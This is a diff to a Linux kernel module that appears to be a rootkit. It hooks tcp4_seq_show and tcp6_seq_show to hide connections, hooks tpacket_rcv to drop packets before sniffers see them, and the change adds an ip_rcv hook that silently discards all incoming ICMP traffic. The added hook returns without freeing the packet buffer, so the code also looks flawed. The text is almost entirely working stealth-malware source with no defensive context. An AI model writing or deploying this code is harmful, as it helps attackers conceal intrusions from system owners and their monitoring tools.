@@ -17,6 +17,9 @@ MODULE_VERSION("1.0");
 
 static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
+static asmlinkage int (*ip_rcv_t)(struct sk_buff *skb, struct net_device *dev, 
+        struct packet_type *pt, struct net_device *orig_dev);
+
 static int (*orig_tpacket_rcv)(struct sk_buff *skb, struct net_device *dev,
 		struct packet_type *pt, struct net_device *orig_dev);
 
@@ -42,7 +45,7 @@ static int hooked_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
 				return NET_RX_DROP;
 			}
 		}
-	} else if (skb->protocol == htons(ETH_P_IPV6)) {
+    } else if (skb->protocol == htons(ETH_P_IPV6)) {
 		ip6h = ipv6_hdr(skb);
 		if (ip6h->nexthdr == IPPROTO_TCP) {
 			tcph = (void *)ip6h + sizeof(*ip6h);
@@ -85,10 +88,33 @@ static asmlinkage long hooked_tcp6_seq_show(struct seq_file *seq, void *v)
     return ret;
 }
 
+static int hook_ip_rcv(struct sk_buff *skb, struct net_device *dev,struct packet_type *pt, struct net_device *orig_dev) {
+struct iphdr *ip_header;
+
+        if ( !skb ){
+            goto origin;
+        }
+        
+ip_header = ip_hdr(skb);
+
+        if( !ip_header ){
+            goto origin;
+        }    
+        
+        switch(ip_header->protocol) {
+                case IPPROTO_ICMP:
+                        return 0;
+        }
+origin:
+         return ip_rcv_t(skb, dev, pt, orig_dev);
+
+}
+
 static struct ftrace_hook new_hooks[] = {
     HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &orig_tcp4_seq_show),
     HOOK("tcp6_seq_show", hooked_tcp6_seq_show, &orig_tcp6_seq_show),
 	HOOK("tpacket_rcv", hooked_tpacket_rcv, &orig_tpacket_rcv),
+    HOOK("ip_rcv",hook_ip_rcv,&ip_rcv_t),
 };
 
 
